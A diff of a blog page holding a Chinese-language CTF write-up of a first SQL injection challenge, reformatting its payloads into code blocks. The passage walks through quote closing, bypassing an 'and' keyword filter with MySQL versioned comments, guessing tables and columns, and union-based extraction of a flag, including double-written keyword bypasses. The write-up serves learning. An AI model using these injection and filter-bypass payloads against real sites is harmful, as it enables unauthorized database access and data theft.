@@ -100,7 +100,7 @@
 <meta property="og:url" content="http://Merl1ng.com/2017/08/02/记第一道sql注入/index.html">
 <meta property="og:site_name" content="Merl1ng">
 <meta property="og:description" content="正在学习sql注入 差不多完整理解了一道注入题把方法和思路记录下来(&amp;gt;ω&amp;lt;)">
-<meta property="og:updated_time" content="2017-08-02T16:01:17.440Z">
+<meta property="og:updated_time" content="2017-08-02T16:06:20.019Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="记第一道sql注入">
 <meta name="twitter:description" content="正在学习sql注入 差不多完整理解了一道注入题把方法和思路记录下来(&amp;gt;ω&amp;lt;)">
@@ -355,12 +355,12 @@
         <p>正在学习sql注入 差不多完整理解了一道注入题<br>把方法和思路记录下来(&gt;ω&lt;)<br><a id="more"></a><br>首先提交1 即?id=1 得到<br>ID: 1<br>name: baloteli</p>
 <p>提交1’ 报错  near ‘’1’’’<br>说明单引号影响了语句 且sql语句中id值两旁有 ‘ ‘ -&gt;要闭合单引号<br>网页中SELECT语句大致语法为 SELECT * FROM users WHERE id = ‘$id’</p>
 <p>然后提交 1’or ‘’=’<br>得到<br>ID: 1’ or ‘’=’<br>name: baloteli<br>ID: 1’ or ‘’=’<br>name: kanawaluo<br>ID: 1’ or ‘’=’<br>name: dengdeng<br>即分别提交 1 2 3 所显示的消息<br>并且可以得知 or没有被过滤</p>
-<p>试下and关键字<br>两种同样写法 (为了闭合单引号)<br>1’ and ‘1’=’1 没反应<br>1’ and 1=1 or’’=’ 报错<br>第一种更简洁 但是第二种回显效果更好<br>说明and被过滤</p>
-<p>1’ /<em>and</em>/ ‘1’=’1<br>1’ /<em>and</em>/ 1=1 or’’=’<br>均同上 说明还是不行 and被过滤</p>
-<p>1’ /<em>!and</em>/ ‘1’=’1 只回显了id为1的值<br>1’ /<em>!and</em>/ 1=1 or’’=’ 回显了id为1 2 3的值<br>成功绕过</p>
-<p>猜表名<br>?id=’ or /<em>!exists</em>/ (/<em>!select</em>/ <em> /</em>!from<em>/ admin) /</em>!and<em>/ ‘’=’<br>报错Table ‘web10.admin’ doesn’t exist<br>换flag猜下<br>?id=’ or /</em>!exists<em>/ (/</em>!select<em>/ </em> /<em>!from</em>/ flag) /<em>!and</em>/ ‘’=’<br>可以，那么就猜列名<br>?id=’ or /<em>!exists</em>/ (/<em>!select</em>/ id /<em>!from</em>/ flag) /<em>!and</em>/ ‘’=’<br>?id=’ or /<em>!exists</em>/ (/<em>!select</em>/ name /<em>!from</em>/ flag) /<em>!and</em>/ ‘’=’<br>都可以</p>
-<p>联合查询 加上/<em>!where</em>/ ‘’=’是为了闭合单引号<br>?id=’ /<em>!union</em>/ /<em>!select</em>/ 1,2 /<em>!from</em>/ flag /<em>!where</em>/ ‘’=’<br>报错The used SELECT statements have a different number of columns<br>?id=’ /<em>!union</em>/ /<em>!select</em>/ 1 /<em>!from</em>/ flag /<em>!where</em>/ ‘’=’<br>可以 所以当前表只查找一列</p>
-<p>?id=’ /<em>!union</em>/ /<em>!select</em>/ name /<em>!from</em>/ flag /<em>!where</em>/ ‘’=’<br>报错Unknown column ‘name’ in ‘field list’<br>这里比较奇怪 明明之前exists判断出有name列 结果这里联合就报没有这个name列</p>
+<p>试下and关键字<br>两种写法 (为了闭合单引号) (两种写法只做一个简单的比较)<br><code>1&#39; and &#39;1&#39;=&#39;1</code> 没反应<br><code>1&#39; and 1=1 or&#39;&#39;=&#39;</code> 报错<br>第一种更简洁 但是第二种回显效果更好<br>说明and被过滤</p>
+<p><code>1&#39; /*and*/ &#39;1&#39;=&#39;1</code><br><code>1&#39; /*and*/ 1=1 or&#39;&#39;=&#39;</code><br>均同上 说明还是不行 and被过滤</p>
+<p><code>1&#39; /*!and*/ &#39;1&#39;=&#39;1</code>只回显了id为1的值<br><code>1&#39; /*!and*/ 1=1 or&#39;&#39;=&#39;</code> 回显了id为1 2 3的值<br>成功绕过</p>
+<p>猜表名<br><code>?id=&#39; or /*!exists*/ (/*!select*/ * /*!from*/ admin) /*!and*/ &#39;&#39;=&#39;</code><br>报错Table ‘web10.admin’ doesn’t exist<br>换flag猜下<br><code>?id=&#39; or /*!exists*/ (/*!select*/ * /*!from*/ flag) /*!and*/ &#39;&#39;=&#39;</code><br>可以，那么就猜列名<br><code>?id=&#39; or /*!exists*/ (/*!select*/ id /*!from*/ flag) /*!and*/ &#39;&#39;=&#39;</code><br><code>?id=&#39; or /*!exists*/ (/*!select*/ name /*!from*/ flag) /*!and*/ &#39;&#39;=&#39;</code><br>都可以</p>
+<p>联合查询 加上<code>/*!where*/ &#39;&#39;=&#39;</code>是为了闭合单引号<br><code>?id=&#39; /*!union*/ /*!select*/ 1,2 /*!from*/ flag /*!where*/ &#39;&#39;=&#39;</code><br>报错The used SELECT statements have a different number of columns<br><code>?id=&#39; /*!union*/ /*!select*/ 1 /*!from*/ flag /*!where*/ &#39;&#39;=&#39;</code><br>可以 所以当前表只查找一列</p>
+<p><code>?id=&#39; /*!union*/ /*!select*/ name /*!from*/ flag /*!where*/ &#39;&#39;=&#39;</code><br>报错Unknown column ‘name’ in ‘field list’<br>这里比较奇怪 明明之前exists判断出有name列 结果这里联合就报没有这个name列</p>
 <p><em>实际这道题是过滤了关键字后紧挨空格的情况所以可以双写空格关键字绕过</em></p>
 <p>最终的查询语句为<br><code>&#39;unionunion  selectselect  flag fromfrom  flag wherewhere &#39;&#39;=&#39;</code><br>或者<br><code>&#39; /*!union*/ /*!select*/ flag /*!from*/ flag /*!where*/ &#39;&#39;=&#39;</code></p>
 
